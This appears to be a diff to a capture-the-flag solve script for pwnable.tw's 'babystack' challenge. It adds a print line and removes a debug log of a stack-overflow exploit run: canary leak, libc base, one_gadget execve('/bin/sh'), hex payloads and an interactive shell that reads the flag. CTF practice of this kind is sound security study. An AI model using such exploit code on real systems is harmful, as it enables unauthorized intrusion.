@@ -104,6 +104,7 @@ leak_libc = bf(14, pad(8))
 libc.address = leak_bytes(leak_libc[8:], 0x78439)
 lg("libc base", libc.address)
 
+print("Spawn shell")
 '''
 0x45216 execve("/bin/sh", rsp+0x30, environ)
 constraints:
@@ -124,96 +125,3 @@ magic_copy(pad(63))
 slan(p, b'>>', 2)
 
 ia(p)
-
-'''
-$ py solve.py DEBUG
-[+] Opening connection to chall.pwnable.tw on port 10205: Done
-Leaking canary
-...
-b'\x1d\x8e\xa2\xe2\xe8\xa1\x9b\x94pVp#\x81O\x97o'
-...
-[DEBUG] Received 0x4 bytes:
-    b'\n'
-    b'>> '
-[DEBUG] Sent 0x2 bytes:
-    b'1\n'
-[DEBUG] Received 0xf bytes:
-    b'Your passowrd :'
-[DEBUG] Sent 0xf bytes:
-    00000000  41 41 41 41  41 41 41 41  39 b4 04 2d  fe 7e 0a     │AAAA│AAAA│9··-│·~·│
-    0000000f
-[DEBUG] Received 0xf bytes:
-    b'Login Success !'
-[DEBUG] Received 0x4 bytes:
-    b'\n'
-    b'>> '
-[DEBUG] Sent 0x2 bytes:
-    b'1\n'
-libc base -> 0x7efe2cfd3000
-one gadget -> 0x7efe2d018216
-[DEBUG] Received 0x3 bytes:
-    b'>> '
-[DEBUG] Sent 0x2 bytes:
-    b'1\n'
-[DEBUG] Received 0xf bytes:
-    b'Your passowrd :'
-[DEBUG] Sent 0x70 bytes:
-    00000000  00 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │·AAA│AAAA│AAAA│AAAA│
-    00000010  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
-    *
-    00000040  2b 42 ea 09  dc a4 84 69  ed 3f ad 02  70 5a 56 06  │+B··│···i│·?··│pZV·│
-    00000050  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
-    00000060  41 41 41 41  41 41 41 41  16 82 01 2d  fe 7e 00 00  │AAAA│AAAA│···-│·~··│
-    00000070
-[DEBUG] Received 0xf bytes:
-    b'Login Success !'
-[DEBUG] Received 0x4 bytes:
-    b'\n'
-    b'>> '
-[DEBUG] Sent 0x2 bytes:
-    b'3\n'
-[DEBUG] Received 0x6 bytes:
-    b'Copy :'
-[DEBUG] Sent 0x3f bytes:
-    b'A' * 0x3f
-[DEBUG] Received 0x12 bytes:
-    b'It is magic copy !'
-[DEBUG] Received 0x4 bytes:
-    b'\n'
-    b'>> '
-[DEBUG] Sent 0x2 bytes:
-    b'2\n'
-[*] Switching to interactive mode
- $ cd home
-[DEBUG] Sent 0x8 bytes:
-    b'cd home\n'
-$ ls
-[DEBUG] Sent 0x3 bytes:
-    b'ls\n'
-[DEBUG] Received 0xa bytes:
-    b'babystack\n'
-babystack
-$ cd babystack
-[DEBUG] Sent 0xd bytes:
-    b'cd babystack\n'
-$ ls
-[DEBUG] Sent 0x3 bytes:
-    b'ls\n'
-[DEBUG] Received 0x33 bytes:
-    b'babystack\n'
-    b'babystack.bak\n'
-    b'babystack.bak2\n'
-    b'flag\n'
-    b'run.sh\n'
-babystack
-babystack.bak
-babystack.bak2
-flag
-run.sh
-$ cat flag
-[DEBUG] Sent 0x9 bytes:
-    b'cat flag\n'
-[DEBUG] Received 0x1f bytes:
-    b'FLAG{Its_juS7_a_st4ck0v3rfl0w}\n'
-FLAG{Its_juS7_a_st4ck0v3rfl0w}
-'''
